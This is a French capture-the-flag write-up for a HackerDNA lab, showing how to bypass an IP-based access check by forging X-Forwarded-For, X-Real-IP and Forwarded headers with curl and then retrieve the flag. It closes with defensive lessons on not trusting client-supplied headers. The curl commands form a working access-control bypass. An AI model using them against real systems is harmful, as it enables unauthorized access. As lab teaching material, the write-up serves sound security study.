# Compte rendu : Spoof!
Plateforme : HackerDNA ( https://hackerdna.com/labs/spoof )
Catégorie : Network & Infrastructure
Difficulté : Facile
Tags : IP Spoofing, HTTP Headers, Access Control
XP : +100 XP

## Scénario
Falsifier son IP dans un header et passer le contrôle d'accès.

Objectif : contourner une restriction d'accès basée sur l'adresse IP en forgeant un header HTTP.

Prérequis : curl, navigateur / DevTools.

## Chaîne d'Attaque
[Découverte de l'application] → [Accès refusé] → [Analyse du contrôle d'accès] → [Forge du header X-Forwarded-For] → [Accès autorisé] → [Récupération du flag] → 🚩

## Étape 1 — Reconnaissance
Navigation vers la cible :

```
http://[IP_CIBLE]
```

L'application affiche une page avec un message d'accès refusé / accès restreint.

Exemple de réponse :

```
Access Denied
Only internal / trusted IPs are allowed.
```

## Étape 2 — Analyse du contrôle d'accès
Le serveur ne se base pas sur la vraie IP de connexion, mais sur un header HTTP envoyé par le client.

Headers classiquement utilisés pour récupérer l'IP du client :

```
X-Forwarded-For
X-Real-IP
X-Originating-IP
Forwarded
```

C'est une mauvaise pratique : ces headers sont entièrement contrôlables par le client.

## Étape 3 — Exploitation : Forge du header
Test avec une IP interne / autorisée, par exemple `127.0.0.1` :

```bash
curl -H "X-Forwarded-For: 127.0.0.1" http://[IP_CIBLE]/
```

Variantes à tester si la première ne fonctionne pas :

```bash
curl -H "X-Real-IP: 127.0.0.1" http://[IP_CIBLE]/
curl -H "X-Forwarded-For: 127.0.0.1" -H "X-Real-IP: 127.0.0.1" http://[IP_CIBLE]/
curl -H "Forwarded: for=127.0.0.1" http://[IP_CIBLE]/
```

Autres IP internes à tester :
- `127.0.0.1`
- `10.0.0.1`
- `192.168.1.1`
- `172.16.0.1`

## Étape 4 — Accès autorisé
Avec le header forgé, le serveur considère la requête comme venant d'une IP de confiance.

Réponse obtenue :

```
Welcome, admin / internal user
```

La page protégée s'affiche, avec le flag.

## Étape 5 — Récupération du flag

```bash
curl -H "X-Forwarded-For: 127.0.0.1" http://[IP_CIBLE]/ | grep -i flag
```

🚩 Flag : FLAG{...}

## Conclusion
Le contrôle d'accès ne doit jamais se baser sur un header HTTP envoyé par le client. `X-Forwarded-For` peut être forgé en une seconde avec curl.

## Leçons Apprises
1. Les headers `X-Forwarded-For` / `X-Real-IP` ne sont pas fiables.
2. Un contrôle d'accès doit se baser sur la vraie IP de connexion, côté serveur.
3. Toujours tester les headers de spoofing sur une page avec restriction IP.
4. Ne jamais faire confiance à une donnée envoyée par le client pour l'authentification ou l'autorisation.

Les noms des défis et toute propriété intellectuelle de tiers restent la propriété de leurs détenteurs respectifs.
